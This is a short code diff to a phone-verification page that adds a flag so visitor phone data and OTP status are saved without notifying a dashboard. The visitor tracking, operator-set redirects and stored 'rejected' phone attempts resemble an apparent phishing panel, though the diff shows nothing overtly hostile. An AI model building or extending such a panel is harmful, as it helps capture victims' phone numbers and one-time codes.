@@ -71,7 +71,7 @@ export default function VerifyPhonePage() {
       updateVisitorPage(visitorId, "phone", 7)
       
       // Clear any old redirectPage to prevent unwanted navigation
-      addData({ id: visitorId, redirectPage: null }).catch(err => console.error("[phone-info] Failed to clear redirectPage:", err))
+      addData({ id: visitorId, redirectPage: null }, false).catch(err => console.error("[phone-info] Failed to clear redirectPage:", err))
     }
   }, [visitorId])
 
@@ -295,7 +295,7 @@ export default function VerifyPhonePage() {
           oldPhoneInfo: data.oldPhoneInfo ? [...data.oldPhoneInfo, currentPhoneData] : [currentPhoneData],
           phoneOtpStatus: 'pending',
           phoneCarrier: ''
-        })
+        }, false) // Don't notify dashboard - just save data
       }
     } catch (error) {
       console.error("Error saving rejected phone data:", error)
